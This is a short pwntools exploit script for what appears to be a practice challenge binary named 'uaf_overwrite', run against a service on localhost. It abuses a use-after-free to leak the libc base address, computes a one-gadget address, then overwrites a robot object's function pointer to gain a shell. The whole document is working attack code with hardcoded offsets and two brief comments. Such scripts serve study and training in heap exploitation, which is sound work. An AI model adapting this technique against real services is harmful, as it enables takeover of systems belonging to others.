from pwn import *

#p = process('./uaf_overwrite')
p = remote('127.0.0.1', 7182)

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())

# UAF to calculate the `libc_base`
custom(0x500, b'aaaa', -1)
custom(0x500, b'aaaa', -1)
custom(0x500, b'aaaa', 0)
custom(0x500, b'a', -1)

libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3dea61
one_gadget = libc_base + 0x10a41c # 제약 조건을 만족하는 원 가젯 주소 계산

# UAF to manipulate `robot->fptr` & get shell
human(1, one_gadget)
robot(1)
p.interactive()